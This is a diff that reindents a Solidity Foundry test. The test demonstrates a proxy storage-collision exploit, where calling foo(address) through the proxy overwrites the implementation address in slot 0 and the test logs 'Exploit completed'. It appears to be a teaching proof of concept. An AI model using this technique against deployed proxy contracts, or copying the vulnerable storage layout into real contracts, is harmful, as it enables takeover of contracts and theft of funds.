@@ -7,16 +7,16 @@ contract ContractTest is Test {
         Logic LogicContract;
         Proxy ProxyContract;
 
-function testStorageCollision() public {
+    function testStorageCollision() public {
 
-    LogicContract = new Logic();
-    ProxyContract = new Proxy(address(LogicContract));
+        LogicContract = new Logic();
+        ProxyContract = new Proxy(address(LogicContract));
 
-    console.log("Current implementation contract address:",ProxyContract.implementation());
-    ProxyContract.invoke(
-        abi.encodeWithSignature("foo(address)",address(this)));
-    console.log("Overwrited slot0 implementation contract address:",ProxyContract.implementation());
-    console.log("Exploit completed");
+        console.log("Current implementation contract address:",ProxyContract.implementation());
+        ProxyContract.invoke(
+            abi.encodeWithSignature("foo(address)",address(this)));
+        console.log("Overwrited slot0 implementation contract address:",ProxyContract.implementation());
+        console.log("Exploit completed");
     }
     receive() payable external{}
 }
